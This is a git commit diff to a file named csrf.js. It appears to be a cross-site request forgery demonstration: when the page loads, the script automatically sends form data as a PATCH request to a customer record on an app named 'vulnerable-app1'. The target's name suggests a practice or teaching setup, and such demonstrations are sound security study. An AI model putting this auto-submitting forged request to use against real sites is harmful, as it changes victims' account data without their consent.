de18bdbda5701ea9bdf2b3a1e8098dbf22515791
kotonekurita <kotone.kurita@di-v.co.jp>
2021-03-14 00:55:45 +0900

    Update csrf.js

--- docs/csrf.js
+++ docs/csrf.js
@@ -1,17 +1,13 @@
 window.addEventListener("DOMContentLoaded", () => {
-	// const iframe = document.getElementById("csrf-iframe");
-  // const form = iframe.contentWindow.document.querySelector('#csrf-form');
   const form = document.querySelector('#csrf-form');
   // const form = document.getElementById('csrf-form');
 
   const formData = new FormData(form);
-  console.log(formData)
   const XHR = new XMLHttpRequest(formData);
     XHR.open("PATCH", "https://vulnerable-app1.herokuapp.com/customers/4", true);
     XHR.responseType = "json";
     XHR.send(formData);
     XHR.onload = () => {
-      if (form) return false;
     }
-  // form.submit()
+    if (form) return false;
 })
